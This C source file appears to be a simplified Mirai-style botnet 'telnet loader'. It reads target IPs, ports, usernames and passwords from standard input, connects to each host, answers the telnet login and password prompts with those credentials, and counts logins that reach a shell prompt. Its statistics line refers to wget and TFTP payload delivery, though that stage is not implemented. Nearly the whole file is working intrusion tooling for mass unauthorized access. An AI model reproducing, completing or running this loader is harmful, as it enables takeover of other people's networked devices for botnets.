#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/telnet_info.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);

char *id_tag = "telnet.loader";

// Simplified connection tracking
static int total_connections = 0;
static int active_connections = 0;
static int successful_logins = 0;
static int successful_runs = 0;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

int attempt_connection(struct telnet_info *info) {
    int fd;
    struct sockaddr_in addr;
    int ret;
    
    printf("[DEBUG] Attempting connection to %u:%d\n", info->addr, ntohs(info->port));
    
    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("[DEBUG] Socket creation failed: %s\n", strerror(errno));
        return -1;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    
    ret = connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    if (ret == -1) {
        if (errno == ECONNREFUSED) {
            printf("[DEBUG] Connection refused\n");
        } else if (errno == ETIMEDOUT) {
            printf("[DEBUG] Connection timeout\n");
        } else {
            printf("[DEBUG] Connection failed: %s\n", strerror(errno));
        }
        close(fd);
        return -1;
    }
    
    printf("[DEBUG] Connection established\n");
    return fd;
}

void handle_connection(int fd, struct telnet_info *info) {
    char buffer[1024];
    int ret;
    
    printf("[DEBUG] Handling connection for %s\n", info->user);
    
    // Simple telnet negotiation simulation
    ret = recv(fd, buffer, sizeof(buffer) - 1, MSG_DONTWAIT);
    if (ret > 0) {
        buffer[ret] = '\0';
        printf("[DEBUG] Received: %s", buffer);
        
        // Simulate login process
        if (strstr(buffer, "login") || strstr(buffer, "Login")) {
            printf("[DEBUG] Sending username: %s\n", info->user);
            send(fd, info->user, strlen(info->user), 0);
            send(fd, "\r\n", 2, 0);
            
            usleep(100000); // 100ms delay
            
            ret = recv(fd, buffer, sizeof(buffer) - 1, MSG_DONTWAIT);
            if (ret > 0) {
                buffer[ret] = '\0';
                printf("[DEBUG] Received: %s", buffer);
                
                if (strstr(buffer, "password") || strstr(buffer, "Password")) {
                    printf("[DEBUG] Sending password: %s\n", info->pass);
                    send(fd, info->pass, strlen(info->pass), 0);
                    send(fd, "\r\n", 2, 0);
                    
                    usleep(100000); // 100ms delay
                    
                    ret = recv(fd, buffer, sizeof(buffer) - 1, MSG_DONTWAIT);
                    if (ret > 0) {
                        buffer[ret] = '\0';
                        printf("[DEBUG] Final response: %s", buffer);
                        
                        if (strstr(buffer, "$") || strstr(buffer, "#") || strstr(buffer, ">")) {
                            printf("[DEBUG] Login successful!\n");
                            pthread_mutex_lock(&stats_mutex);
                            successful_logins++;
                            pthread_mutex_unlock(&stats_mutex);
                        }
                    }
                }
            }
        }
    }
    
    close(fd);
    
    pthread_mutex_lock(&stats_mutex);
    active_connections--;
    pthread_mutex_unlock(&stats_mutex);
}

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    struct telnet_info info;
    int line_count = 0;

    printf("[DEBUG] Loader starting...\n");
    printf("[DEBUG] Process ID: %d\n", getpid());

    if (argc == 2)
    {
        id_tag = args[1];
        printf("[DEBUG] ID tag: %s\n", id_tag);
    }

    printf("[DEBUG] Starting stats thread...\n");
    pthread_create(&stats_thrd, NULL, stats_thread, NULL);
    printf("[DEBUG] Stats thread started\n");

    printf("[DEBUG] Entering main connection loop...\n");
    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
        {
            printf("[DEBUG] EOF received, breaking main loop\n");
            break;
        }

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        printf("[DEBUG] Processing line: %s\n", strbuf);
        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
            printf("[DEBUG] Failed to parse telnet info: \"%s\"\n", strbuf);
        }
        else
        {
            printf("[DEBUG] Parsed telnet info - IP: %u, Port: %d, User: %s, Pass: %s, Arch: %s\n", 
                   info.addr, ntohs(info.port), info.user, info.pass, info.arch);
            
            // Check if we have room for more connections
            if (active_connections >= 20) {
                printf("[DEBUG] Too many active connections, skipping\n");
                continue;
            }
            
            // Attempt connection
            int fd = attempt_connection(&info);
            if (fd != -1) {
                pthread_mutex_lock(&stats_mutex);
                total_connections++;
                active_connections++;
                pthread_mutex_unlock(&stats_mutex);
                
                // Handle connection in a simple way
                handle_connection(fd, &info);
            }
            
            line_count++;
            if(line_count % 10 == 0) {
                printf("[DEBUG] Processed %d lines\n", line_count);
                sleep(1);
            }
        }
    }

    printf("[DEBUG] Hit end of input.\n");
    printf("[DEBUG] Total connections: %d, Successful logins: %d\n", 
           total_connections, successful_logins);

    // Wait for all connections to complete
    while(active_connections > 0) {
        printf("[DEBUG] Waiting for %d active connections to complete...\n", active_connections);
        sleep(1);
    }

    printf("[DEBUG] Loader completed successfully\n");
    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        pthread_mutex_lock(&stats_mutex);
        printf("[%ds] -> Conns: [%d] Logins: [%d] Ran: [%d] -> Echoes: [0] Wgets: [0] TFTPs: [0]\n", 
               seconds, active_connections, successful_logins, successful_runs);
        pthread_mutex_unlock(&stats_mutex);
        sleep(1);
        seconds++;
    }
}
